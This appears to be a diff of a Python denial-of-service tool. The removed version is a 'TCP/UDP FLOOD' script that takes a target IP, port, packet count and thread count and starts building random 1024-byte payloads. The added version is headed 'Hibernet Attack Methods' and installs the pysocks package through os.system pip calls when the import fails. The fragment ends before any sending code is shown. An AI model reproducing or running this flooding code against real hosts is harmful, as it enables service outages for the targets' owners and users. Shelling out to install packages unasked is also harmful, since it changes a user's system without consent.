@@ -1,27 +1,17 @@
-#!/usr/bin/env python3
-import argparse
-import random
+#import module
+import os, sys
+
+try:
+    import socks
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks")
+    else:
+        os.system("pip install pysocks")
+#@title Hibernet Attack Methods
 import socket
-import threading
-
-ap = argparse.ArgumentParser()
-ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
-ap.add_argument("-p", "--port", required=True, type=int, help="Port")
-ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
-ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
-ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
-args = vars(ap.parse_args())
-
-print("#-- TCP/UDP FLOOD --#")
-ip = args['ip']
-port = args['port']
-choice = args['choice']
-times = args['times']
-threads = args['threads']
-
-def run():
-	data = random._urandom(1024)
-	import socket
 import socks
 import threading
 import random
